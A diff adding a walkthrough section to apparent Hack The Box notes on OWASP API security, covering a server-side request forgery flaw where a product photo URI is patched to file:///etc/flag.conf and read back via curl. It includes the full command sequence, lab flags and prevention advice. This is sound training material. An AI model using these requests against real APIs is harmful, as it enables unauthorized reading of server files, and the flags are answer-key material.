@@ -61,6 +61,82 @@ Don't add complexity. The section tells you exactly what to test. Do that one th
 | 6 — Unrestricted Resource Consumption | Spam SMS OTP endpoint with no rate limiting | `HTB{01de742d8cd942ad682aeea9ce3c5428}` |
 | 7 — BFLA | GET `/api/v1/customers/billing-addresses` with no roles | `HTB{1e2095c564baf0d2d316080217040dae}` |
 | 8 — Unrestricted Access to Sensitive Business Flows | Filter billing addresses by customer ID from BFLA endpoint | `788 Sauchiehall St.` |
+| 9 — SSRF | PATCH product `PNGPhotoFileURI` to `file:///etc/flag.conf`, GET `/products/{ID}/photo` | `HTB{3c94232c4f0b0a544ae4024833eef0b3}` |
+
+---
+
+## Section 9: Server Side Request Forgery (API7:2023)
+
+### What It Is
+
+SSRF occurs when an API uses user-controlled input to fetch local or remote resources without validation. An attacker can point the server at arbitrary local files or internal services, bypassing firewalls or VPNs.
+
+- **CWE:** CWE-918 — Server-Side Request Forgery
+- **OWASP:** API7:2023
+
+### Attack Pattern
+
+Two SSRF vectors exist in this app — both follow the same pattern:
+
+1. **Create a resource** that has a file URI field (`pngPhotoFileURI`, `certificateOfIncorporationPDFFileURI`)
+2. **Upload a file** via the dedicated upload endpoint → note the returned `fileURI` format (`file:///app/wwwroot/...`)
+3. **PATCH** the resource to change the file URI to `file:///etc/flag.conf`
+4. **GET** the file endpoint → server reads whatever URI is stored and returns contents as base64
+5. **Decode** the base64
+
+### The Right Endpoint Matters
+
+The hint pointed to the **products** endpoints, not the supplier-companies certificate endpoints. The certificate endpoint had file read errors for `/etc/flag.conf`; the products photo endpoint could read it. Always check the hint when stuck — there may be multiple SSRF vectors with different behaviors.
+
+### Commands
+
+#### Create a product (required before PATCH)
+```bash
+curl -s -X POST 'http://<TARGET>/api/v1/products/current-user' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"NewProduct":{"Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"NotProvidedYet"}}' | jq
+```
+
+#### Get supplier ID
+```bash
+curl -s 'http://<TARGET>/api/v1/suppliers/current-user' -H "Authorization: Bearer $JWT" | jq
+```
+
+#### PATCH product photo URI to target file
+```bash
+curl -s -X PATCH 'http://<TARGET>/api/v1/products' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"UpdatedProduct":{"ProductID":"<PRODUCT_ID>","SupplierID":"<SUPPLIER_ID>","Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"file:///etc/flag.conf"}}' | jq
+```
+
+#### GET photo → returns file contents as base64
+```bash
+curl -s 'http://<TARGET>/api/v1/products/<PRODUCT_ID>/photo' -H "Authorization: Bearer $JWT" | jq -r '.base64Data' | base64 -d
+```
+
+### What Works
+
+- Products photo SSRF can read `/etc/flag.conf` — the certificate endpoint could not (different file permissions or app user context)
+- `PNGPhotoFileURI` field accepts `file://` URIs without validation
+- Product must be created first — you need a `ProductID` to PATCH
+- `PNGPhotoFileURI: "NotProvidedYet"` is the accepted placeholder when creating a product without a real photo
+
+### What Doesn't Work
+
+- Certificate of incorporation SSRF (`/api/v1/supplier-companies`) could not read `/etc/flag.conf` — returns "An error occurred while reading the file"
+- Only files readable by the app process are accessible — `/etc/resolv.conf`, `/etc/passwd` etc. failed on the certificate endpoint
+- Chaining PATCH + GET with `&&` hides individual failures — run commands separately
+
+### Exercise Result
+
+- **User:** `htbpentester11@pentestercompany.com`
+- **Supplier ID:** `5d489453-3538-4973-9479-2c37b2a5db73`
+- **Product ID created:** `24c39437-fcf4-4982-8155-dcaeea41c556`
+- **SSRF endpoint:** `PATCH /api/v1/products` → `PNGPhotoFileURI: file:///etc/flag.conf`
+- **Read endpoint:** `GET /api/v1/products/{ID}/photo` → base64-encoded file contents
+- **Flag:** `HTB{3c94232c4f0b0a544ae4024833eef0b3}`
+
+### Prevention
+
+- Validate that file URIs only point to permissible paths (e.g., within `wwwroot/ProductPhotos/`)
+- The GET endpoint serving file contents must restrict access to its designated folder
+- Never accept user-controlled file URIs without strict allowlist validation
 
 ---
 
